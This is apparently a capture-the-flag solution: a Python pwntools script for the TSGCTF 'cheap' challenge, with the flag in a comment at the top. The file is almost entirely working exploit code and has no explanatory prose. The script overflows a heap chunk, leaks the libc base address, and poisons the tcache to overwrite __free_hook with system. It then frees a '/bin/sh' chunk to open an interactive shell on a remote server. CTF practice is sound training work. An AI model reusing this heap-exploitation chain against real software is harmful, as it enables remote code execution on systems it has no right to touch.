#TSGCTF{Heap_overflow_is_easy_and_nice_yeyey}
from pwn import *

elf = ELF("./cheap")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("34.146.101.4", 30001)

def sla(d):
    target.sendlineafter(":", str(d))

def create(size, data="_whoamiT"):
    sla(1)
    sla(size)
    #if data == "whoamiT":
    #    data = "A"*size
    sla(data)

def show():
    sla(2)

def rem():
    sla(3)

create(0xf8)
rem()
create(0x68)
rem()
create(0x600 - 0x70 - 8)
create(0x18)
create(0xf8, "A"*0xf8 + p64(0x601))
rem()
create(0x68, "B"*8)
rem()
create(0xf8, "A"*0x100)
show()

target.recvuntil("A"*0x100)
libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - 0x7fe69d889be0 + 0x00007fe69d69e000
log.info("LIBC Base: " + hex(libc_base))

rem()
create(0xf8, "A"*0xf8 + p64(0x601))
create(0x18)
rem()
create(0x28)
rem()
create(0x38)
rem()
create(0x68)
rem()
create(0x18, "A"*0x18 + p64(0x71))
rem()
create(0x28, "a"*8)
rem()
create(0x18, "A"*0x18 + p64(0x71) + p64(libc_base + libc.sym['__free_hook'] - 8)[:7])
create(0x68)
create(0x68, "/bin/sh\x00" + p64(libc_base + libc.sym['system']))
rem()
'''

#'''
#gdb.attach(target, 'heap bins\n heap chunks')







target.interactive()